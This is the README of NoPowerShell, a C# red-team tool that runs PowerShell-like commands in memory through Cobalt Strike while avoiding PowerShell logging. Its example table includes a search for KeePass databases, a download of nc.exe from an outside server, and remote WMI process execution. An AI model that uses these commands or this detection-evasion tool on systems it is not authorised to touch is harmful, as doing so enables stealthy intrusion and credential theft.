# NoPowerShell
NoPowerShell is a tool implemented in C# which supports executing PowerShell-like commands while remaining invisible to any PowerShell logging mechanisms. This .NET Framework 2 compatible binary can be loaded in Cobalt Strike to execute commands in-memory. No `System.Management.Automation.dll` is used; only native .NET libraries.

Moreover, this project makes it easy for everyone to extend its functionality using only a few lines of C# code.

# Screenshots
## Currently supported commands
Running in Cobalt Strike.
![NoPowerShell supported commands](https://raw.githubusercontent.com/bitsadmin/nopowershell/master/Pictures/CurrentlySupportedCommands.png "NoPowerShell in Cobalt Strike")
## Sample commands
![NoPowerShell sample commands](https://raw.githubusercontent.com/bitsadmin/nopowershell/master/Pictures/SampleCommands.png "NoPowerShell in Cobalt Strike")


# Usage
## Note
When using NoPowerShell from cmd.exe or PowerShell, you need to escape the pipe character (`|`) with respectively a caret (`^`) or a backtick (`` ` ``), i.e.:

- cmd.exe: `ls ^| select Name`
- PowerShell: ```ls `| select Name```

## Examples
| Action | Command | Notes |
| - | - | - |
| List help | `NoPowerShell.exe` | Alternative: `NoPowerShell.exe Get-Command` |
| View status of a service   | `NoPowerShell.exe Get-WmiObject -Class Win32_Service -Filter "Name = 'WinRM'"` | |
| Search for KeePass database in C:\Users folder | `NoPowerShell.exe gci C:\Users\ -Force -Recurse -Include *.kdbx \| select Directory,Name,Length` | |
| View system information | `NoPowerShell.exe systeminfo` | |
| List processes on the system | `NoPowerShell.exe Get-Process` | |
| Show current user | `NoPowerShell.exe whoami` | Unofficial command |
| List autoruns | `NoPowerShell.exe Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run` | |
| List network shares connected to from this machine | `NoPowerShell.exe Get-NetSmbMapping` | |
| Download file | `NoPowerShell.exe wget http://myserver.me/nc.exe` | When compiled using .NET 2 only supports SSL up to SSLv3 (no TLS 1.1+) |
| List PowerShell processes on remote system | `NoPowerShell.exe gwmi "Select ProcessId,Name,CommandLine From Win32_Process" -ComputerName dc1.corp.local \| ? Name -Like "powershell*" \| select ProcessId,CommandLine` | Explicit credentials can be specified using the `-Username` and `-Password` parameters |
| Execute program using WMI | `NoPowerShell.exe Invoke-WmiMethod -Class Win32_Process -Name Create "cmd /c calc.exe"` | |

## Install in Cobalt Strike
1. Copy both NoPowerShell.exe and NoPowerShell.cna to the **scripts** subfolder of Cobalt Strike
2. Launch Cobalt Strike and load the .cna script in the Script Manager
3. Interact with a beacon and execute commands using the `nps` command

# Known issues
- Pipeline characters need to surrounded by spaces
- TLS 1.1+ is not supported by .NET Framework 2, so any site enforcing it will result in a connection error

# Improvements
- Fix above issues
- Improve stability by adding exception handling
- Support for parameter groups
- Add support for ArrayArgument parameter
- Add support for .NET code in commandline, i.e.: `[System.Security.Principal.WindowsIdentity]::GetCurrent().Name`

# Contributing
Add your own cmdlets by submitting a pull request.
## Requirement
- Maintain .NET 2.0 compatibility in order to support the broadest range of operating systems

## Instructions
Use the TemplateCommand.cs file in the Commands folder to construct new cmdlets. The TemplateCommand cmdlet is hidden from the list of available cmdlets, but can be called in order to understand its workings. This command looks as follows: `Get-TemplateCommand [-MyFlag] -MyInteger [Int32] -MyString [Value]` and is also accessible via alias `gtc`.

### Example usages

| Action | Command |
| - | - |
| Simply run with default values | `gtc` |
| Run with the -MyFlag parameter which executes the 'else' statement | `gtc -MyFlag` |
| Run with the -MyInteger parameter which changes the number of iterations from its default number of 5 iterations to whatever number is provided | `gtc -MyInteger 10` |
| Run with the -MyString parameter which changes the text that is printed from its default value of 'Hello World' to whatever string is provided | `gtc -MyString "Bye PowerShell"` |
| Combination of parameters | `gtc -MyInteger 10 -MyString "Bye PowerShell"` |
| Combination of parameters - Alternative | `gtc -MyInteger 10 -MyString "Bye PowerShell"` |
| Combination of parameters - Using fact that MyString is the only mandatory parameter for this command | `gtc -MyInteger 10 "Bye PowerShell"` |
| Command in combination with a couple of data manipulators in the pipe | `gtc "Bye PowerShell" -MyInteger 30 \| ? Attribute2 -Like Line1* \| select Attribute2 \| fl` |

Execute the following steps to implement your own cmdlet:
1. Create a copy of the **TemplateCommand.cs** file.
    * In case you are implementing a native PowerShell command, place it in folder the corresponding to the _Source_ attribute when executing in PowerShell: `Get-Command My-Commandlet`. Example of a native command: `Get-Command Get-Process` -> Source: `Microsoft.PowerShell.Management` -> Place the .cs file in the **Management** subfolder.
    * In case it is a non-native command, place it in the **Additional** folder.
2. Update the `TemplateCommand` classname and its constructor name.
3. Update the static **Aliases** variable to the command and aliases you want to use to call this cmdlet. For native PowerShell commands you can lookup the aliases using `Get-Alias | ? ResolvedCommandName -EQ My-Commandlet` to obtain the list of aliases. Always make sure the full command is the first "alias", for example: `Get-Alias | ? ResolvedCommandName -EQ Get-Process` -> Aliases are: `Get-Process`, `gps`, `ps`
4. Update the static **Synopsis** variable to a small text that describes the command. This will be shown in the help.
5. Update the arguments supported by the command by adding _StringArguments_, _BoolArguments_ and _IntegerArguments_ to the static **SupportedArguments** variable.
6. In the Execute function:
    1. Fetch the values of the _StringArguments_, _BoolArguments_ and _IntegerArguments_ as shown in the examples;
    2. Based on the parameters provided by the user, perform your actions;
    3. Make sure all results are stored in the `_results` variable.
7. Remove all of the template sample code and comments from the file to keep the source tidy.

# Contributed NoPowerShell cmdlets
Authors of additional NoPowerShell cmdlets are added to the table below. Moreover, the table lists commands that are requested by the community to add. Together we can develop a powerful NoPowerShell toolkit!

| Cmdlet | Contributed by | GitHub | Twitter |
| - | - | - | - |
| Resolve-DnsName |  |  |  |
| Get-ADUser |  |  |  |
| Get-ADGroupMember |  |  |  |

# Included NoPowerShell cmdlets
| Cmdlet | Category | Notes |
| - | - | - |
| Get-SystemInfo | Additional | Few fields still need to be added to mimick systeminfo.exe |
| Get-Whoami | Additional | whoami.exe /ALL is not implemented yet |
| Get-Command | Core | |
| Where-Object | Core | |
| Copy-Item | Management | |
| Get-Content | Management | |
| Get-Process | Management | Quick & dirty implementation |
| Invoke-WmiMethod | Management | Quick & dirty implementation |
| Get-ChildItem | Management | |
| Get-ItemProperty | Management | |
| Get-WmiObject | Management | |
| Remove-Item | Management | |
| Get-NetIPAddress | NetTCPIP | |
| Get-NetRoute | NetTCPIP | |
| Test-NetConnection | NetTCPIP | |
| Get-SmbMapping | SmbShare | |
| Format-List | Utility | |
| Format-Table | Utility | |
| Invoke-WebRequest | Utility |
| Select-Object | Utility |

**Authored by Arris Huijgen (@_bitsadmin - https://github.com/bitsadmin)**
